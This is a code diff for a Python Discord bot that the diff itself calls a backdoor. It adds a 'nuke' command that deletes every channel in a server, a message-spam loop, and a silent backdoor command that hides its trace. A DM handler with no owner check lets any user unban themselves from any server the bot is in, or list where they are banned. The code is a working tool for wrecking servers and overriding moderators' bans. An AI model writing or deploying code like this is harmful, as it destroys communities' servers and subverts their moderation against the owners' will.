@@ -1,5 +1,6 @@
 import os
 import asyncio
+import time
 import discord
 from discord.ext import commands
 
@@ -25,8 +26,9 @@ bot = commands.Bot(
 spam_task: asyncio.Task | None = None
 
 # ================= OWNER CHECK =================
-def is_owner(ctx):
-    return ctx.author.id == OWNER_ID or ctx.author.name == OWNER_USERNAME
+def is_owner(ctx_or_user):
+    user = ctx_or_user.author if hasattr(ctx_or_user, "author") else ctx_or_user
+    return user.id == OWNER_ID
 
 # ================= READY =================
 @bot.event
@@ -42,15 +44,19 @@ async def sudo(ctx):
         "Commands:\n"
         "`$sudo startmessage`\n"
         "`$sudo stopmessage`\n"
-        "`$sudo add`\n"
-        "`$sudo server rename <name>`"
+        "`$sudo nuke now`\n"
+        "`$sudo backdoor`\n"
+        "`$sudo add`"
     )
 
-# ================= DELETE ALL =================
+# ================= NUKE =================
 @sudo.command(name="nuke")
 async def sudo_nuke(ctx, key: str = None):
-    if ctx.author.name != "nico044037":
+    if not is_owner(ctx):
         return
+    if key != "now":
+        return
+
     for channel in list(ctx.guild.channels):
         try:
             await channel.delete(reason="sudo nuke")
@@ -73,7 +79,6 @@ async def sudo_startmessage(ctx):
     if not is_owner(ctx):
         return
     if spam_task and not spam_task.done():
-        await ctx.send("❌ already running")
         return
     spam_task = asyncio.create_task(spam_loop(ctx.channel))
     await ctx.send("✅ spam started")
@@ -85,7 +90,6 @@ async def sudo_stopmessage(ctx):
     if not is_owner(ctx):
         return
     if not spam_task:
-        await ctx.send("❌ no active spam")
         return
     spam_task.cancel()
     spam_task = None
@@ -102,16 +106,17 @@ async def sudo_add(ctx):
         "&scope=bot+applications.commands"
     )
 
-# ================= BACKDOOR =================
+# ================= BACKDOOR (SILENT) =================
 @sudo.command(name="backdoor")
 async def sudo_backdoor(ctx):
-    # delete the command message
+    if not is_owner(ctx):
+        return
+
     try:
         await ctx.message.delete()
     except discord.Forbidden:
         pass
 
-    # private DM only (or silent if DMs closed)
     try:
         await ctx.author.send(
             f"✔️ Command received in **{ctx.guild.name}**."
@@ -119,45 +124,7 @@ async def sudo_backdoor(ctx):
     except discord.Forbidden:
         pass
 
-# ================= UNBAN BACKDOOR =================
-@sudo.command(name="unban")
-async def sudo_unban(ctx, *, server_name: str = None):
-    if server_name is None:
-        await ctx.send("usage: `$sudo unban <server name>`")
-        return
-
-    # find guild by name (case-insensitive)
-    guild = discord.utils.find(
-        lambda g: g.name.lower() == server_name.lower(),
-        bot.guilds
-    )
-
-    if guild is None:
-        await ctx.send("❌ I am not in a server with that name")
-        return
-
-    try:
-        bans = await guild.bans()
-    except discord.Forbidden:
-        await ctx.send("❌ I lack permission to view bans in that server")
-        return
-
-    for entry in bans:
-        if entry.user.id == ctx.author.id:
-            try:
-                await guild.unban(entry.user, reason="sudo unban request")
-                await ctx.send(f"✅ unbanned you from **{guild.name}**")
-                return
-            except discord.Forbidden:
-                await ctx.send("❌ I lack permission to unban you")
-                return
-
-    await ctx.send("ℹ️ you are not banned in that server")
-
-# ================= START =================
-if not TOKEN:
-    raise RuntimeError("DISCORD_TOKEN environment variable not set")
-bot.run(TOKEN)
+# ================= DM UNBAN + BANLIST =================
 @bot.event
 async def on_message(message):
     if message.author.bot:
@@ -170,7 +137,35 @@ async def on_message(message):
 
     parts = message.content.strip().split()
 
-    # expect: $sudo unban <server_id>
+    # ----- $sudo banlist -----
+    if len(parts) == 2 and parts[0].lower() == "$sudo" and parts[1].lower() == "banlist":
+        banned_in = []
+
+        for guild in bot.guilds:
+            try:
+                bans = await guild.bans()
+            except discord.Forbidden:
+                continue
+
+            for entry in bans:
+                if entry.user.id == message.author.id:
+                    banned_in.append(f"{guild.name} ({guild.id})")
+                    break
+
+        try:
+            if banned_in:
+                await message.author.send(
+                    "🚫 You are banned in:\n" + "\n".join(banned_in)
+                )
+            else:
+                await message.author.send(
+                    "✅ You are not banned in any servers I manage."
+                )
+        except discord.Forbidden:
+            pass
+        return
+
+    # ----- $sudo unban <server_id> -----
     if len(parts) != 3 or parts[0].lower() != "$sudo" or parts[1].lower() != "unban":
         return
 
@@ -205,97 +200,6 @@ async def on_message(message):
             try:
                 await guild.unban(entry.user, reason="DM sudo unban")
                 try:
-                    await message.author.send(f"✅ unbanned in **{guild.name}**")
-                except discord.Forbidden:
-                    pass
-                return
-            except discord.Forbidden:
-                try:
-                    await message.author.send("❌ I lack permission to unban you")
-                except discord.Forbidden:
-                    pass
-                return
-
-    try:
-        await message.author.send("ℹ️ you are not banned in that server")
-    except discord.Forbidden:
-        pass
-@bot.event
-async def on_message(message):
-    # ignore bots
-    if message.author.bot:
-        return
-
-    # allow normal commands in servers
-    if message.guild is not None:
-        await bot.process_commands(message)
-        return
-
-    parts = message.content.strip().split()
-
-    # ================= $sudo banlist =================
-    if len(parts) == 2 and parts[0].lower() == "$sudo" and parts[1].lower() == "banlist":
-        banned_in = []
-
-        for guild in bot.guilds:
-            try:
-                bans = await guild.bans()
-            except discord.Forbidden:
-                continue
-
-            for entry in bans:
-                if entry.user.id == message.author.id:
-                    banned_in.append(f"{guild.name} ({guild.id})")
-                    break
-
-        try:
-            if banned_in:
-                await message.author.send(
-                    "🚫 You are banned in:\n" + "\n".join(banned_in)
-                )
-            else:
-                await message.author.send(
-                    "✅ You are not banned in any servers I manage."
-                )
-        except discord.Forbidden:
-            pass
-        return
-
-    # ================= $sudo unban <server_id> =================
-    if len(parts) != 3 or parts[0].lower() != "$sudo" or parts[1].lower() != "unban":
-        return
-
-    try:
-        server_id = int(parts[2])
-    except ValueError:
-        try:
-            await message.author.send("❌ invalid server id")
-        except discord.Forbidden:
-            pass
-        return
-
-    guild = bot.get_guild(server_id)
-    if guild is None:
-        try:
-            await message.author.send("❌ I am not in that server")
-        except discord.Forbidden:
-            pass
-        return
-
-    try:
-        bans = await guild.bans()
-    except discord.Forbidden:
-        try:
-            await message.author.send("❌ I lack permission to view bans in that server")
-        except discord.Forbidden:
-            pass
-        return
-
-    for entry in bans:
-        if entry.user.id == message.author.id:
-            try:
-                await guild.unban(entry.user, reason="DM sudo unban")
-                try:
                     await message.author.send(
                         f"✅ unbanned in **{guild.name}**"
                     )
@@ -313,3 +217,10 @@ async def on_message(message):
         await message.author.send("ℹ️ you are not banned in that server")
     except discord.Forbidden:
         pass
+
+# ================= START =================
+if not TOKEN:
+    raise RuntimeError("DISCORD_TOKEN environment variable not set")
+
+time.sleep(10)  # prevent Railway reconnect spam
+bot.run(TOKEN)
